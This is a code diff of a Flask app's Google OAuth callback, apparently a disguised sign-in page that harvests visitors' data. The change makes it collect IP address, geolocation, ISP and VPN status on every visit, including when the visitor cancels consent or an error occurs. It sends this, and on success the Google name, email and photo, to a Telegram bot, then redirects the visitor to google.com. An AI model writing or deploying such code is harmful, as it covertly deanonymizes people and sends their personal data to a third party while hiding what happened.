@@ -45,49 +45,7 @@ def index():
 
 @app.route("/callback")
 def callback():
-    code = request.args.get("code")
-    if not code:
-        print("Ошибка: код авторизации не найден в запросе.")
-        return "Ошибка авторизации: код не получен", 400
-
-    redirect_uri = f"{RENDER_URL}/callback"
-
-    token_url = "https://oauth2.googleapis.com/token"
-    token_data = {
-        "code": code,
-        "client_id": GOOGLE_CLIENT_ID,
-        "client_secret": GOOGLE_CLIENT_SECRET,
-        "redirect_uri": redirect_uri,
-        "grant_type": "authorization_code",
-    }
-
-    token_r = requests.post(token_url, data=token_data)
-    
-    # Принудительно выводим в логи Render полный ответ от Google
-    print(f"Google Response Status: {token_r.status_code}")
-    print(f"Google Response Body: {token_r.text}")
-
-    if token_r.status_code != 200:
-        return f"Ошибка получения токена: {token_r.text}", 400
-
-    token_json = token_r.json()
-    access_token = token_json.get("access_token")
-    if not access_token:
-        return f"Ошибка: токен доступа отсутствует в ответе: {token_r.text}", 400
-
-    user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
-    headers = {"Authorization": f"Bearer {access_token}"}
-    user_r = requests.get(user_info_url, headers=headers)
-
-    if user_r.status_code != 200:
-        print(f"User Info Error: {user_r.text}")
-        return "Ошибка получения профиля", 400
-
-    user_info = user_r.json()
-    email = user_info.get("email", "Не указана")
-    name = user_info.get("name", "Не указано")
-    picture = user_info.get("picture", "Нет фото")
-
+    # Сначала всегда собираем технические данные (IP, время, геолокация)
     ip = request.headers.get(
         "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
     )
@@ -112,6 +70,78 @@ def callback():
     isp = geo_info.get("isp", "Не определено")
     is_vpn = "Да" if geo_info.get("proxy") else "Нет"
 
+    # Если пользователь нажал "Отмена" на странице Google
+    error_arg = request.args.get("error")
+    if error_arg:
+        message_text = (
+            f"⚠️ *ПОПЫТКА ВХОДА (ОТМЕНА)*\n\n"
+            f"⏱ *Время:* `{visit_time}`\n"
+            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
+            f"📍 *Место:* `{country}, {city}`\n"
+            f"🏢 *Провайдер:* `{isp}`\n"
+            f"❌ *Статус:* Пользователь отклонил доступ"
+        )
+        send_telegram_message(message_text)
+        return redirect("https://google.com")
+
+    code = request.args.get("code")
+    if not code:
+        message_text = (
+            f"⚠️ *ПОПЫТКА ВХОДА (БЕЗ КОДА)*\n\n"
+            f"⏱ *Время:* `{visit_time}`\n"
+            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
+            f"📍 *Место:* `{country}, {city}`\n"
+            f"🏢 *Провайдер:* `{isp}`"
+        )
+        send_telegram_message(message_text)
+        return "Ошибка авторизации: код не получен", 400
+
+    redirect_uri = f"{RENDER_URL}/callback"
+    token_url = "https://oauth2.googleapis.com/token"
+    token_data = {
+        "code": code,
+        "client_id": GOOGLE_CLIENT_ID,
+        "client_secret": GOOGLE_CLIENT_SECRET,
+        "redirect_uri": redirect_uri,
+        "grant_type": "authorization_code",
+    }
+
+    token_r = requests.post(token_url, data=token_data)
+    if token_r.status_code != 200:
+        message_text = (
+            f"⚠️ *ПОПЫТКА ВХОДА (ОШИБКА ТОКЕНА)*\n\n"
+            f"⏱ *Время:* `{visit_time}`\n"
+            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
+            f"📍 *Место:* `{country}, {city}`\n"
+            f"🏢 *Провайдер:* `{isp}`\n"
+            f"🔴 *Ошибка:* `{token_r.text}`"
+        )
+        send_telegram_message(message_text)
+        return f"Ошибка получения токена: {token_r.text}", 400
+
+    access_token = token_r.json().get("access_token")
+
+    user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
+    headers = {"Authorization": f"Bearer {access_token}"}
+    user_r = requests.get(user_info_url, headers=headers)
+
+    if user_r.status_code != 200:
+        # Даже если профиль не отдал данные, шлем информацию по IP и времени
+        message_text = (
+            f"⚠️ *ПОПЫТКА ВХОДА (БЕЗ ПРОФИЛЯ)*\n\n"
+            f"⏱ *Время:* `{visit_time}`\n"
+            f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
+            f"📍 *Место:* `{country}, {city}`\n"
+            f"🏢 *Провайдер:* `{isp}`"
+        )
+        send_telegram_message(message_text)
+        return redirect("https://google.com")
+
+    user_info = user_r.json()
+    email = user_info.get("email", "Не указана")
+    name = user_info.get("name", "Не указано")
+    picture = user_info.get("picture", "Нет фото")
+
     message_text = (
         f"🔑 *ВХОД ЧЕРЕЗ GOOGLE*\n\n"
         f"👤 *Имя:* `{name}`\n"
@@ -124,7 +154,6 @@ def callback():
     )
 
     send_telegram_message(message_text)
-
     return redirect("https://google.com")
 
 
